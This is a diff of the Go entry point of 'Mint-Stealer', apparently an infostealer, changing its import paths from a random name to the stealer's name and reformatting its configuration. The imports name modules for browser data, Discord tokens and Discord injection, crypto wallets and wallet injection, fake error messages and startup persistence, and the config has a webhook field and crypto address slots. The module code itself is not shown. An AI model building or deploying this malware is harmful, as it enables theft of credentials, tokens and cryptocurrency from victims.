@@ -1,32 +1,32 @@
 package main
 
 import (
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/browsers"
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/commonfiles"
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/discodes"
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/discordinjection"
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/fakeerror"
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/games"
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/startup"
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/system"
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/tokens"
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/wallets"
-	"github.com/0xFl4q/1237FHJQSDF1234/modules/walletsinjection"
-	"github.com/0xFl4q/1237FHJQSDF1234/utils/program"
+	"github.com/0xFl4q/Mint-Stealer/modules/browsers"
+	"github.com/0xFl4q/Mint-Stealer/modules/commonfiles"
+	"github.com/0xFl4q/Mint-Stealer/modules/discodes"
+	"github.com/0xFl4q/Mint-Stealer/modules/discordinjection"
+	"github.com/0xFl4q/Mint-Stealer/modules/fakeerror"
+	"github.com/0xFl4q/Mint-Stealer/modules/games"
+	"github.com/0xFl4q/Mint-Stealer/modules/startup"
+	"github.com/0xFl4q/Mint-Stealer/modules/system"
+	"github.com/0xFl4q/Mint-Stealer/modules/tokens"
+	"github.com/0xFl4q/Mint-Stealer/modules/wallets"
+	"github.com/0xFl4q/Mint-Stealer/modules/walletsinjection"
+	"github.com/0xFl4q/Mint-Stealer/utils/program"
 )
 
 func main() {
 	CONFIG := map[string]interface{}{
 		"webhook": "s",
 		"cryptos": map[string]string{
-			"BTC": "s",
-			"ETH": "s",
-			"MON": "s",
-			"LTC": "s",
-			"XCH": "ss",
-			"PCH": "",
-			"CCH": "s",
-			"ADA": "s",
+			"BTC":  "s",
+			"ETH":  "s",
+			"MON":  "s",
+			"LTC":  "s",
+			"XCH":  "ss",
+			"PCH":  "",
+			"CCH":  "s",
+			"ADA":  "s",
 			"DASH": "ss",
 		},
 		"modules": map[string]bool{
